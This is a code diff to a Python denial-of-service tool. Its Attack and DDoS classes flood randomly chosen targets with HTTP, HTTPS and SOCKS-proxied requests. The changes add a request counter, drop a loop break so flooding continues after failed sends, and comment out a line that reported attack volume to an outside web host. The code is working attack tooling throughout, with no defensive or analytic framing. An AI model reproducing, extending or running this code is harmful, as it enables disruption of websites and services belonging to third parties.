@@ -258,6 +258,7 @@ class Attack:
         return s
 
     def attack_url_socks(target, proxy):
+        global reqs
         s = Attack.create_connection_using_socks_proxy(proxy)
         if target.PROTOCOL == 'https':
             ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -281,12 +282,16 @@ class Attack:
                 else:
                     stats.add_bytes(len(request))
                     stats.add_good()
+                    reqs += 1
+
             s.close()
         except:
             stats.add_bad()
             s.close()
 
     def attack_url_http(target, proxy):
+        global reqs
+
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(TIMEOUT)
         try:
@@ -298,18 +303,24 @@ class Attack:
         try:
             for id in range(MAX_SIMPLE_CONNECTION_REQUESTS):
                 request = Requests.gen_http_request(target, head=Requests.get_extended_head(target))
+                # print("sent")
+
                 sent = s.send(str.encode(request))
+                # print("got")
                 if not sent:
                     stats.add_bad()
-                    break
                 stats.add_bytes(len(request))
                 stats.add_good()
+                reqs += 1
+
             s.close()
         except:
             stats.add_bad()
             s.close()
 
     def attack_url_https(target, proxy):
+        global reqs
+
 ################################################
 #
 #       attack_url_https ne pashe, tomu tut stoyit kostil
@@ -353,6 +364,8 @@ class Attack:
                     else:
                         stats.add_bytes(len(request))
                         stats.add_good()
+                        reqs += 1
+
             s.close()
         except Exception as e:
             stats.add_bad()
@@ -391,7 +404,6 @@ class DDoS:
             try:
                 target = self.__target_manager.get_rand()
                 proxy = self.__proxy_manager.get_rand()
-
                 Attack.attack_url(target, proxy)
             except Exception as e:
                 print(e)
@@ -411,16 +423,16 @@ ddos = DDoS()
 ddos_thread = threading.Thread(target=ddos.run)
 ddos_thread.start()
 
-
+reqs = 0
 cur_bytes = 0
 
 def send_data():
     global cur_bytes
     while True:
-        time.sleep(1200)
+        time.sleep(5)
         b = stats.get_bytes()
-        print(b)
-        requests.get("https://roflclicker.000webhostapp.com/ddos/getinfo.php?bytes="+str(b-cur_bytes))
+        print(b, reqs)
+        # requests.get("https://roflclicker.000webhostapp.com/ddos/getinfo.php?bytes="+str(b-cur_bytes))
         cur_bytes = b
 
 data_thread = threading.Thread(target=send_data)
